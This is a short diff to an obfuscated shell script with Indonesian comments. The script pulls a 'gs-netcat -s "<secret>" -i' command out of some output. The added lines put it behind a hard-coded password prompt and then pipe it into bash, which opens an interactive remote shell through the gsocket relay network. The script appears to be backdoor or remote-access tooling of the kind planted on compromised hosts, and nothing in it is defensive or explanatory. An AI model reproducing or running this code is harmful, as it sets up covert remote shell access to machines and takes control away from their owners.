@@ -39,6 +39,24 @@ u_136ac113=$(b_b9caa2a7 "$o_8ecaead4")
 
 if echo "$u_136ac113" | grep -oE 'gs-netcat -s ".*?" -i' >/dev/null; then
     echo "Success ==> $(echo "$u_136ac113" | grep -oE 'gs-netcat -s ".*?" -i')"
+
+    # === Password Tambahan ===
+    echo ""
+    echo -n "Masukkan Password Tambahan: "
+    read -s pass2
+    echo ""
+
+    if [ "$pass2" = "Bebek@133&!" ]; then
+        echo "Hus Hus Cabut Sana ! Mending Turu !!!!"
+        echo "OliverSykes : DISINI !"
+        
+        # Jalankan gs-netcat pakai secret yang asli (dari output)
+        echo "$u_136ac113" | grep -oE 'gs-netcat -s ".*?" -i' | bash
+    else
+        echo "Password salah!"
+        exit 1
+    fi
+
 else
     echo "Failed :("
 fi
